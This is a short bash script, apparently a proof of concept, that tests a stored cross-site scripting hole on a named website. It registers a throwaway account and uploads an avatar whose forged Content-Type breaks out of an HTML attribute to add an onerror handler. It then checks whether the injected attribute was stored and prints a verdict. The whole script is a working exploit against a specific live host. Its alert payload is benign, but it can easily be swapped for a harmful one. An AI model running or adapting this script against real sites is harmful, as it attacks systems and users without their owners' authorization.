#!/usr/bin/env bash
# Verify whether a crafted upload Content-Type can inject an HTML attribute
# into the stored avatar data URL (stored XSS vector).
set -u
B="https://strangerhelp.com"
JAR=$(mktemp)
EMAIL="xsstest-$RANDOM$RANDOM@example.com"
PW="test-password-12345"

printf '{"name":"XSS Probe","email":"%s","password":"%s","city":"Mumbai"}' "$EMAIL" "$PW" > /tmp/x.json
echo "register -> $(curl -s -c $JAR -X POST "$B/api/auth/register" -H 'Content-Type: application/json' -H "Origin: $B" --data-binary @/tmp/x.json -o /dev/null -w '%{http_code}')"

# 1x1 PNG
printf '\x89PNG\r\n\x1a\n' > /tmp/tiny.png
head -c 40 /dev/urandom >> /tmp/tiny.png

# Craft a Content-Type that closes the src attribute and adds an event handler.
PAYLOAD='image/png" onerror="alert(document.domain)" data-x="'

echo "uploading avatar with Content-Type: $PAYLOAD"
curl -s -b $JAR -X POST "$B/api/auth/profile" -H "Origin: $B" \
  -F "avatar=@/tmp/tiny.png;type=$PAYLOAD" -o /dev/null -w "  upload status=%{http_code}\n"

echo "stored avatar prefix (first 120 chars):"
curl -s -b $JAR "$B/api/auth/me" \
  | sed 's/.*"avatar":"\([^"]*\)".*/\1/' | head -c 120
echo
echo
echo "VERDICT:"
curl -s -b $JAR "$B/api/auth/me" | grep -q 'onerror' \
  && echo "  VULNERABLE - attribute-breaking payload persisted in avatar" \
  || echo "  safe - payload not present in stored avatar"

echo "XSS_EMAIL=$EMAIL"
rm -f $JAR /tmp/x.json /tmp/tiny.png
